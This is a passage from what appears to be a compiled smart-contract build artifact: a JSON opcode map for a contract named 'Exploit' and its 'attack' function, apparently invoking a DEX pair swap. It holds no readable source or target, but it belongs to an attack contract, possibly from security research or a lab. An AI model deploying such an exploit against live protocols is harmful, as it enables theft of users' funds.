      "offset": [
        5312,
        5357
      ],
      "op": "CALL",
      "path": "0"
    },
    "4492": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4493": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4494": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4495": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x119C"
    },
    "4498": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4499": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4500": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4502": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4503": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4504": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4505": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4507": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4508": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4509": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "POP",
      "path": "0"
    },
    "4510": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "POP",
      "path": "0"
    },
    "4511": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "POP",
      "path": "0"
    },
    "4512": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "POP",
      "path": "0"
    },
    "4513": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4515": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4516": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4517": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4519": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "NOT",
      "path": "0"
    },
    "4520": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4522": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4523": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "ADD",
      "path": "0"
    },
    "4524": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "AND",
      "path": "0"
    },
    "4525": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4526": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "ADD",
      "path": "0"
    },
    "4527": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4528": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4530": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4531": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "POP",
      "path": "0"
    },
    "4532": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4533": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "ADD",
      "path": "0"
    },
    "4534": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4535": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x11C0"
    },
    "4538": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4539": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4540": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14DF"
    },
    "4543": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        5312,
        5357
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4544": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4545": {
      "op": "POP"
    },
    "4546": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5377
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 21,
      "value": "0x11"
    },
    "4548": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5377
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "4549": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4551": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4552": {
      "op": "PUSH4",
      "value": "0x22C0D9F"
    },
    "4557": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "4559": {
      "op": "SHL"
    },
    "4560": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4561": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4562": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "4564": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4565": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "ADD",
      "path": "0"
    },
    "4566": {
      "op": "DUP4"
    },
    "4567": {
      "op": "SWAP1"
    },
    "4568": {
      "op": "MSTORE"
    },
    "4569": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5377
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4571": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "4573": {
      "op": "DUP3"
    },
    "4574": {
      "op": "ADD"
    },
    "4575": {
      "op": "DUP2"
    },
    "4576": {
      "op": "SWAP1"
    },
    "4577": {
      "op": "MSTORE"
    },
    "4578": {
      "fn": "Exploit.attack",
      "offset": [
        5405,
        5409
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "4579": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "4581": {
      "op": "DUP4"
    },
    "4582": {
      "op": "ADD"
    },
    "4583": {
      "op": "MSTORE"
    },
    "4584": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "4586": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "4588": {
      "op": "DUP4"
    },
    "4589": {
      "op": "ADD"
    },
    "4590": {
      "op": "MSTORE"
    },
    "4591": {
      "op": "PUSH1",
      "value": "0x84"
    },
    "4593": {
      "op": "DUP3"
    },
    "4594": {
      "op": "ADD"
    },
    "4595": {
      "op": "MSTORE"
    },
    "4596": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4598": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4600": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4602": {
      "op": "SHL"
    },
    "4603": {
      "op": "SUB"
    },
    "4604": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5377
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4605": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5377
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4606": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5377
      ],
      "op": "AND",
      "path": "0"
    },
    "4607": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5377
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4608": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5382
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x22C0D9F"
    },
    "4613": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5382
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4614": {
      "op": "PUSH1",
      "value": "0xA4"
    },
    "4616": {
      "op": "ADD"
    },
    "4617": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4619": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4621": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4622": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4623": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4624": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "SUB",
      "path": "0"
    },
    "4625": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4626": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4628": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP8",
      "path": "0"
    },
    "4629": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4630": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "4631": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4632": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4633": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4634": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1222"
    },
    "4637": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4638": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4640": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4641": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4642": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4643": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "POP",
      "path": "0"
    },
    "4644": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "GAS",
      "path": "0"
    },
    "4645": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "CALL",
      "path": "0"
    },
    "4646": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4647": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4648": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4649": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1236"
    },
    "4652": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4653": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4654": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4656": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4657": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4658": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4659": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4661": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4662": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4663": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "POP",
      "path": "0"
    },
    "4664": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "POP",
      "path": "0"
    },
    "4665": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "POP",
      "path": "0"
    },
    "4666": {
      "fn": "Exploit.attack",
      "offset": [
        5367,
        5415
      ],
      "op": "POP",
      "path": "0"
    },
    "4667": {
      "fn": "Exploit.attack",
      "offset": [
        4228,
        5422
      ],
      "op": "POP",
      "path": "0"
    },
    "4668": {
      "fn": "Exploit.attack",
      "offset": [
        4228,
        5422
      ],
      "op": "POP",
      "path": "0"
    },
    "4669": {
      "fn": "Exploit.attack",
      "offset": [
        4228,
        5422
      ],
      "op": "POP",
      "path": "0"
    },
    "4670": {
      "fn": "Exploit.attack",
      "offset": [
        4228,
        5422
      ],
      "op": "POP",
      "path": "0"
    },
    "4671": {
      "fn": "Exploit.attack",
      "offset": [
        4228,
        5422
      ],
      "op": "POP",
      "path": "0"
    },
    "4672": {
      "fn": "Exploit.attack",
      "offset": [
        4228,
        5422
      ],
      "op": "POP",
      "path": "0"
    },
    "4673": {
      "fn": "Exploit.attack",
      "offset": [
        4228,
        5422
      ],
      "op": "POP",
      "path": "0"
    },
    "4674": {
      "fn": "Exploit.attack",
      "offset": [
        4228,
        5422
      ],
      "op": "POP",
      "path": "0"
    },
    "4675": {
      "fn": "Exploit.attack",
      "offset": [
        4228,
        5422
      ],
      "op": "POP",
      "path": "0"
    },
    "4676": {
      "fn": "Exploit.attack",
      "offset": [
        4228,
        5422
      ],
      "op": "POP",
      "path": "0"
    },
    "4677": {
      "fn": "Exploit.attack",
      "jump": "o",
      "offset": [
        4202,
        5422
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4678": {
      "op": "JUMPDEST"
    },
    "4679": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4681": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4683": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4685": {
      "op": "SHL"
    },
    "4686": {
      "op": "SUB"
    },
    "4687": {
      "op": "DUP2"
    },
    "4688": {
      "op": "AND"
    },
    "4689": {
      "op": "DUP2"
    },
    "4690": {
      "op": "EQ"
    },
    "4691": {
      "op": "PUSH2",
      "value": "0x125B"
    },
    "4694": {
      "op": "JUMPI"
    },
    "4695": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4697": {
      "op": "DUP1"
    },
    "4698": {
      "op": "REVERT"
    },
    "4699": {
      "op": "JUMPDEST"
    },
    "4700": {
      "op": "POP"
    },
    "4701": {
      "jump": "o",
      "op": "JUMP"
    },
    "4702": {
      "op": "JUMPDEST"
    },
    "4703": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4705": {
      "op": "DUP1"
    },
    "4706": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4708": {
      "op": "DUP1"
    },
    "4709": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4711": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "4713": {
      "op": "DUP7"
    },
    "4714": {
      "op": "DUP9"
    },
    "4715": {
      "op": "SUB"
    },
    "4716": {
      "op": "SLT"
    },
    "4717": {
      "op": "ISZERO"
    },
    "4718": {
      "op": "PUSH2",
      "value": "0x1276"
    },
    "4721": {
      "op": "JUMPI"
    },
    "4722": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4724": {
      "op": "DUP1"
    },
    "4725": {
      "op": "REVERT"
    },
    "4726": {
      "op": "JUMPDEST"
    },
    "4727": {
      "op": "DUP6"
    },
    "4728": {
      "op": "CALLDATALOAD"
    },
    "4729": {
      "op": "PUSH2",
      "value": "0x1281"
    },
    "4732": {
      "op": "DUP2"
    },
    "4733": {
      "op": "PUSH2",
      "value": "0x1246"
    },
    "4736": {
      "jump": "i",
      "op": "JUMP"
    },
    "4737": {
      "op": "JUMPDEST"
    },
    "4738": {
      "op": "SWAP5"
    },
    "4739": {
      "op": "POP"
    },
    "4740": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4742": {
      "op": "DUP7"
    },
    "4743": {
      "op": "ADD"
    },
    "4744": {
      "op": "CALLDATALOAD"
    },
    "4745": {
      "op": "SWAP4"
    },
    "4746": {
      "op": "POP"
    },
    "4747": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "4749": {
      "op": "DUP7"
    },
    "4750": {
      "op": "ADD"
    },
    "4751": {
      "op": "CALLDATALOAD"
    },
    "4752": {
      "op": "SWAP3"
    },
    "4753": {
      "op": "POP"
    },
    "4754": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "4756": {
      "op": "DUP7"
    },
    "4757": {
      "op": "ADD"
    },
    "4758": {
      "op": "CALLDATALOAD"
    },
    "4759": {
      "op": "PUSH8",
      "value": "0xFFFFFFFFFFFFFFFF"
    },
    "4768": {
      "op": "DUP1"
    },
    "4769": {
      "op": "DUP3"
    },
    "4770": {
      "op": "GT"
    },
    "4771": {
      "op": "ISZERO"
    },
    "4772": {
      "op": "PUSH2",
      "value": "0x12AC"
    },
    "4775": {
      "op": "JUMPI"
    },
    "4776": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4778": {
      "op": "DUP1"
    },
    "4779": {
      "op": "REVERT"
    },
    "4780": {
      "op": "JUMPDEST"
    },
    "4781": {
      "op": "DUP2"
    },
    "4782": {
      "op": "DUP9"
    },
    "4783": {
      "op": "ADD"
    },
    "4784": {
      "op": "SWAP2"
    },
    "4785": {
      "op": "POP"
    },
    "4786": {
      "op": "DUP9"
    },
    "4787": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "4789": {
      "op": "DUP4"
    },
    "4790": {
      "op": "ADD"
    },
    "4791": {
      "op": "SLT"
    },
    "4792": {
      "op": "PUSH2",
      "value": "0x12C0"
    },
    "4795": {
      "op": "JUMPI"
    },
    "4796": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4798": {
      "op": "DUP1"
    },
    "4799": {
      "op": "REVERT"
    },
    "4800": {
      "op": "JUMPDEST"
    },
    "4801": {
      "op": "DUP2"
    },
    "4802": {
      "op": "CALLDATALOAD"
    },
    "4803": {
      "op": "DUP2"
    },
    "4804": {
      "op": "DUP2"
    },
    "4805": {
      "op": "GT"
    },
    "4806": {
      "op": "ISZERO"
    },
    "4807": {
      "op": "PUSH2",
      "value": "0x12CF"
    },
    "4810": {
      "op": "JUMPI"
    },
    "4811": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4813": {
      "op": "DUP1"
    },
    "4814": {
      "op": "REVERT"
    },
    "4815": {
      "op": "JUMPDEST"
    },
    "4816": {
      "op": "DUP10"
    },
    "4817": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4819": {
      "op": "DUP3"
    },
    "4820": {
      "op": "DUP6"
    },
    "4821": {
      "op": "ADD"
    },
    "4822": {
      "op": "ADD"
    },
    "4823": {
      "op": "GT"
    },
    "4824": {
      "op": "ISZERO"
    },
    "4825": {
      "op": "PUSH2",
      "value": "0x12E1"
    },
    "4828": {
      "op": "JUMPI"
    },
    "4829": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4831": {
      "op": "DUP1"
    },
    "4832": {
      "op": "REVERT"
    },
    "4833": {
      "op": "JUMPDEST"
    },
    "4834": {
      "op": "SWAP7"
    },
    "4835": {
      "op": "SWAP10"
    },
    "4836": {
      "op": "SWAP6"
    },
    "4837": {
      "op": "SWAP9"
    },
    "4838": {
      "op": "POP"
    },
    "4839": {
      "op": "SWAP4"
    },
    "4840": {
      "op": "SWAP7"
    },
    "4841": {
      "op": "POP"
    },
    "4842": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4844": {
      "op": "ADD"
    },
    "4845": {
      "op": "SWAP5"
    },
    "4846": {
      "op": "SWAP4"
    },
    "4847": {
      "op": "SWAP3"
    },
    "4848": {
      "op": "POP"
    },
    "4849": {
      "op": "POP"
    },
    "4850": {
      "op": "POP"
    },
    "4851": {
      "jump": "o",
      "op": "JUMP"
    },
    "4852": {
      "op": "JUMPDEST"
    },
    "4853": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4855": {
      "op": "DUP1"
    },
    "4856": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "4858": {
      "op": "DUP4"
    },
    "4859": {
      "op": "DUP6"
    },
    "4860": {
      "op": "SUB"
    },
    "4861": {
      "op": "SLT"
    },
    "4862": {
      "op": "ISZERO"
    },
    "4863": {
      "op": "PUSH2",
      "value": "0x1307"
    },
    "4866": {
      "op": "JUMPI"
    },
    "4867": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4869": {
      "op": "DUP1"
    },
    "4870": {
      "op": "REVERT"
    },
    "4871": {
      "op": "JUMPDEST"
    },
    "4872": {
      "op": "POP"
    },
    "4873": {
      "op": "POP"
    },
    "4874": {
      "op": "DUP1"
    },
    "4875": {
      "op": "CALLDATALOAD"
    },
    "4876": {
      "op": "SWAP3"
    },
    "4877": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4879": {
      "op": "SWAP1"
    },
    "4880": {
      "op": "SWAP2"
    },
    "4881": {
      "op": "ADD"
    },
    "4882": {
      "op": "CALLDATALOAD"
    },
    "4883": {
      "op": "SWAP2"
    },
    "4884": {
      "op": "POP"
    },
    "4885": {
      "jump": "o",
      "op": "JUMP"
    },
    "4886": {
      "op": "JUMPDEST"
    },
    "4887": {
      "op": "PUSH4",
      "value": "0x4E487B71"
    },
    "4892": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "4894": {
      "op": "SHL"
    },
    "4895": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4897": {
      "op": "MSTORE"
    },
    "4898": {
      "op": "PUSH1",
      "value": "0x11"
    },
    "4900": {
      "op": "PUSH1",
      "value": "0x4"
    },
    "4902": {
      "op": "MSTORE"
    },
    "4903": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "4905": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4907": {
      "op": "REVERT"
    },
    "4908": {
      "op": "JUMPDEST"
    },
    "4909": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4911": {
      "op": "DUP3"
    },
    "4912": {
      "op": "NOT"
    },
    "4913": {
      "op": "DUP3"
    },
    "4914": {
      "op": "GT"
    },
    "4915": {
      "op": "ISZERO"
    },
    "4916": {
      "op": "PUSH2",
      "value": "0x133F"
    },
    "4919": {
      "op": "JUMPI"
    },
    "4920": {
      "op": "PUSH2",
      "value": "0x133F"
    },
    "4923": {
      "op": "PUSH2",
      "value": "0x1316"
    },
    "4926": {
      "jump": "i",
      "op": "JUMP"
    },
    "4927": {
      "op": "JUMPDEST"
    },
    "4928": {
      "op": "POP"
    },
    "4929": {
      "op": "ADD"
    },
    "4930": {
      "op": "SWAP1"
    },
    "4931": {
      "jump": "o",
      "op": "JUMP"
    },
    "4932": {
      "op": "JUMPDEST"
    },
    "4933": {
      "op": "PUSH4",
      "value": "0x4E487B71"
    },
    "4938": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "4940": {
      "op": "SHL"
    },
    "4941": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4943": {
      "op": "MSTORE"
    },
    "4944": {
      "op": "PUSH1",
      "value": "0x32"
    },
    "4946": {
      "op": "PUSH1",
      "value": "0x4"
    },
    "4948": {
      "op": "MSTORE"
    },
    "4949": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "4951": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4953": {
      "op": "REVERT"
    },
    "4954": {
      "op": "JUMPDEST"
    },
    "4955": {
      "op": "DUP1"
    },
    "4956": {
      "op": "MLOAD"
    },
    "4957": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4959": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4961": {
      "op": "PUSH1",
      "value": "0x70"
    },
    "4963": {
      "op": "SHL"
    },
    "4964": {
      "op": "SUB"
    },
    "4965": {
      "op": "DUP2"
    },
    "4966": {
      "op": "AND"
    },
    "4967": {
      "op": "DUP2"
    },
    "4968": {
      "op": "EQ"
    },
    "4969": {
      "op": "PUSH2",
      "value": "0x1371"
    },
    "4972": {
      "op": "JUMPI"
    },
    "4973": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4975": {
      "op": "DUP1"
    },
    "4976": {
      "op": "REVERT"
    },
    "4977": {
      "op": "JUMPDEST"
    },
    "4978": {
      "op": "SWAP2"
    },
    "4979": {
      "op": "SWAP1"
    },
    "4980": {
      "op": "POP"
    },
    "4981": {
      "jump": "o",
      "op": "JUMP"
    },
    "4982": {
      "op": "JUMPDEST"
    },
    "4983": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4985": {
      "op": "DUP1"
    },
    "4986": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4988": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "4990": {
      "op": "DUP5"
    },
    "4991": {
      "op": "DUP7"
    },
    "4992": {
      "op": "SUB"
    },
    "4993": {
      "op": "SLT"
    },
    "4994": {
      "op": "ISZERO"
    },
    "4995": {
      "op": "PUSH2",
      "value": "0x138B"
    },
    "4998": {
      "op": "JUMPI"
    },
    "4999": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5001": {
      "op": "DUP1"
    },
    "5002": {
      "op": "REVERT"
    },
    "5003": {
      "op": "JUMPDEST"
    },
    "5004": {
      "op": "PUSH2",
      "value": "0x1394"
    },
    "5007": {
      "op": "DUP5"
    },
    "5008": {
      "op": "PUSH2",
      "value": "0x135A"
    },
    "5011": {
      "jump": "i",
      "op": "JUMP"
    },
    "5012": {
      "op": "JUMPDEST"
    },
    "5013": {
      "op": "SWAP3"
    },
    "5014": {
      "op": "POP"
    },
    "5015": {
      "op": "PUSH2",
      "value": "0x13A2"
    },
    "5018": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5020": {
      "op": "DUP6"
    },
    "5021": {
      "op": "ADD"
    },
    "5022": {
      "op": "PUSH2",
      "value": "0x135A"
    },
    "5025": {
      "jump": "i",
      "op": "JUMP"
    },
    "5026": {
      "op": "JUMPDEST"
    },
    "5027": {
      "op": "SWAP2"
    },
    "5028": {
      "op": "POP"
    },
    "5029": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "5031": {
      "op": "DUP5"
    },
    "5032": {
      "op": "ADD"
    },
    "5033": {
      "op": "MLOAD"
    },
    "5034": {
      "op": "PUSH4",
      "value": "0xFFFFFFFF"
    },
    "5039": {
      "op": "DUP2"
    },
    "5040": {
      "op": "AND"
    },
    "5041": {
      "op": "DUP2"
    },
    "5042": {
      "op": "EQ"
    },
    "5043": {
      "op": "PUSH2",
      "value": "0x13BB"
    },
    "5046": {
      "op": "JUMPI"
    },
    "5047": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5049": {
      "op": "DUP1"
    },
    "5050": {
      "op": "REVERT"
    },
    "5051": {
      "op": "JUMPDEST"
    },
    "5052": {
      "op": "DUP1"
    },
    "5053": {
      "op": "SWAP2"
    },
    "5054": {
      "op": "POP"
    },
    "5055": {
      "op": "POP"
    },
    "5056": {
      "op": "SWAP3"
    },
    "5057": {
      "op": "POP"
    },
    "5058": {
      "op": "SWAP3"
    },
    "5059": {
      "op": "POP"
    },
    "5060": {
      "op": "SWAP3"
    },
    "5061": {
      "jump": "o",
      "op": "JUMP"
    },
